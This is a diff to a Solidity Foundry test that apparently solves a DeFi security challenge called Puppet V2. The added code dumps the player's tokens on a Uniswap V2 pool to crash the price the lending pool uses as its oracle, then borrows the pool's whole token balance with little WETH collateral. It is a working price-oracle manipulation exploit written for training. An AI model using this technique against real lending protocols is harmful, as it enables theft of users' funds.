@@ -98,7 +98,29 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+
+        address[] memory path = new address[](2);
+        path[1] = address(weth);
+        path[0] = address(token);
+
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);
+      
+        console.log("player.balance(): ", player.balance);
+        //29_900695134061569016
+
+        uint requiredEth = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('requiredEth: ', requiredEth);
+        //29_496494833197321980
+
+        weth.deposit{value: player.balance}();
+
+        weth.approve(address(lendingPool), requiredEth);
+               
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
